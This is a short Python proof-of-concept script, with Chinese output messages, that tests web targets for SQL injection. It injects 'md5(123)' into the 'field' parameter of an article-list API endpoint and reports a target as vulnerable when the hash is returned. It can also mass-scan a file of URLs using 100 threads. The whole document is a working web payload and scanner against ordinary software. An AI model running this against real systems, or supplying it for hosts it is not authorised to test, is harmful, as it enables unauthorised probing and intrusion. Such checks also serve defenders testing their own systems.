import requests,argparse,sys,json
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
def poc(target):
    payload="/api/v1.index.article/getList.html?field=id,md5(123)&size=1&cat=3&time_stamp=1781864476"
    res1=requests.get(url=target,timeout=5,verify=False)
    try:
        if res1.status_code==200:
            res2=requests.get(url=target+payload,verify=False,timeout=5)
            if json.loads(res2.text)["data"][0]["md5(123)"]=="202cb962ac59075b964b07152d234b70":
                print('[+]存在漏洞')
            else:
                print('[-]没洞')
        else:
            print('[*]无法连接')
    except:
        pass

def main():

    parse=argparse.ArgumentParser(description="sql注入的检测脚本")
    parse.add_argument('-u','--url',dest="url",type=str,help="连接")
    
    parse.add_argument('-f','--file',dest="file",type=str,help="路径")

    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join() 
    else:
        print(f"请输入：python{sys.argv[0]} -h") 
            
if __name__ == "__main__":
    main()



